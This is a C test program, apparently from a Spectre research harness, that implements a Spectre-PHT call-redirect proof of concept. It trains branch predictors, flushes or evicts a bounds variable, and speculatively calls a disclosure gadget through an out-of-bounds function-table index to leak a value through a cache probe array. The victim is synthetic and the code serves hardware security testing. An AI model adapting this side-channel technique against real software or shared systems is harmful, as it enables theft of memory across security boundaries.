#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// PHT call redirect: tests speculative control flow via OOB function table access

static void normal_func(int x);
static void disclosure_gadget(int secret);

typedef void (*func_ptr_t)(int);
static func_ptr_t call_table[8] __attribute__((aligned(64)));

volatile int table_size = 2;
uint8_t* probe_array;

static void __attribute__((noinline)) normal_func(int x) {
    asm volatile("" ::: "memory");
}

static void __attribute__((noinline)) disclosure_gadget(int secret) {
    SPEC_FENCE();
    maccess(probe_array + (secret & 0xFF) * PAGE_SIZE);
}

static void __attribute__((noinline)) victim_function(int idx, int secret) {
    if (idx >= 0 && idx < STALL(table_size)) {
        call_table[idx](secret);
    }
}

typedef struct {
    int training_idx;
    int attack_idx;
#ifdef CACHEUTILS_USE_EVICTION
    eviction_set_t table_size_set;
#endif
} call_redirect_data_t;

void call_redirect_setup(exploit_ctx_t* ctx, void* data) {
    call_redirect_data_t* cr_data = (call_redirect_data_t*)data;

    // All entries point to disclosure_gadget for BTB training
    for (int i = 0; i < 8; i++) {
        call_table[i] = disclosure_gadget;
    }

    cr_data->training_idx = 0;
    cr_data->attack_idx = 2;

#ifdef CACHEUTILS_USE_EVICTION
    if (build_eviction_set_vaddr((void*)&table_size, &cr_data->table_size_set) != 0) {
        fprintf(stderr, "Failed to build eviction set for table_size\n");
        exit(1);
    }
    printf("table_size eviction set: %d addresses\n", cr_data->table_size_set.num_addrs);
#endif
}

void call_redirect_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    call_redirect_data_t* cr_data = (call_redirect_data_t*)data;

    // Phase 1: Train BTB
    for (int t = 0; t < 50; t++) {
        table_size = 10;
        mfence();
        victim_function(2, 0x01);  // Train BTB: indirect call -> disclosure_gadget
    }
    table_size = 2;
    mfence();

    // Phase 2: Interleaved PHT training + attack
    for (int j = 0; j < 60; j++) {
        // Arithmetic masking: j%20<19 -> training, j%20==19 -> attack
        int is_attack = ((j % 20) == 19);
        int idx = is_attack ? cr_data->attack_idx : cr_data->training_idx;
        int secret = is_attack ? encode_index : 0;

#ifdef CACHEUTILS_USE_EVICTION
        evict_with_set(&cr_data->table_size_set);
#else
        flush((void*)&table_size);
#endif
        mfence();

        victim_function(idx, secret);
    }
}

int main() {
    exploit_ctx_t ctx = {0};
    call_redirect_data_t cr_data = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-PHT call-redirect\n");

    exploit_hooks_t hooks = {
        .setup = call_redirect_setup,
        .attack = call_redirect_attack,
        .cleanup = NULL
    };

    exploit_run(&ctx, &hooks, &cr_data);
    exploit_print_results("PHT call-redirect", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
